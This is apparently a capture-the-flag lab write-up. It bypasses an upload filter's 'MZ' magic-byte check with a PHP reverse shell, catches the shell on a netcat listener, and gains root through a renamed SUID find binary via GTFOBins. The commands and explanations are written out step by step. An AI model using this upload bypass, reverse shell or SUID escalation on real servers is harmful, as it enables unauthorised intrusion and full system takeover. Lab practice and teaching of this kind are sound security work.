#Linux #FileUpload #MagicBytes #SourceCodeReview #SUID #GTFOBins #find

## Overview

MZEEAV runs a custom "antivirus" file upload application that checks uploaded files against a PE magic byte signature (MZ). The source code for the upload logic is exposed in a `/backups` directory, making the filter completely transparent. Prepending `MZ` to a PHP reverse shell bypasses it. Post-shell, a SUID binary named `fileS` turns out to be a renamed `find` binary, which GTFOBins converts to a root shell.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
```

### Web Enumeration

```sh
gobuster dir -u http://192.168.180.33 -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/backups              (Status: 301) [--> /backups/]
/upload               (Status: 301) [--> /upload/]
```

`/backups` contained the application's PHP source code.

## Foothold

### Source Code Review, Understanding the Filter

`upload.php` from the backups directory revealed the complete upload logic:

```php
/* Check MagicBytes MZ PEFILE 4D5A*/
$magicbytes = strtoupper(substr(bin2hex($magic),0,4));

if ( strpos($magicbytes, '4D5A') === false ) {
    echo "Error no valid PEFILE\n";
    exit ();
}

rename($tmp_location, $location);
```

The filter reads the first two bytes of the upload, converts them to hex, and checks for `4D5A`, the ASCII value of `MZ`, the Windows Portable Executable magic bytes.

> **Why the source code exposure is the entire exploit:** once you can read the validation logic, bypassing it is trivial. The check only looks at the first two bytes and checks for a literal string match. The rest of the file is unrestricted. Prepending `MZ` to any payload satisfies the check completely.

I took the PenTestMonkey PHP reverse shell and added `MZ` as the first line, making the file start with those bytes while remaining valid PHP. After uploading, I triggered it by visiting the uploaded file path directly:

```
http://192.168.180.33/upload/php-reverse-shell.php
```

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.33] 49664
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

TTY upgrade:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Local flag:

```sh
www-data@mzeeav:/home/avuser$ cat local.txt
‹redacted›
```

## Privilege Escalation

### SUID Binary Masquerading as "fileS"

LinPEAS flagged a SUID bit on an unusual binary:

```
/opt/fileS  (SUID, no read permissions, execute only)
```

Running it with `--version` identified the real binary:

```sh
/opt/fileS --version
find (GNU findutils) 4.8.0
```

The binary is `find` renamed to `fileS`. GTFOBins has a SUID escalation path for `find`:

```sh
./fileS . -exec /bin/sh -p \; -quit
# whoami
root
```

> **Why SUID `find` gives root:** when `find` executes a command via `-exec`, that subprocess inherits the SUID owner's UID (root). The `-p` flag on `/bin/sh` preserves the elevated effective UID rather than dropping it. Renaming the binary doesn't change this, the SUID bit and the binary's code are what matter, not the filename.

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **Always check for exposed source code before attempting blind exploitation.** The `/backups` directory turned a "bypass the upload filter" challenge into a five-minute read.
- **Magic byte filters protect only the first N bytes.** A PHP interpreter doesn't care about leading non-PHP bytes; prepending `MZ` to a PHP file keeps it executable.
- **When a SUID binary isn't in GTFOBins by name, check what it actually is.** `--version` and `strings` both reveal the true identity of renamed binaries.
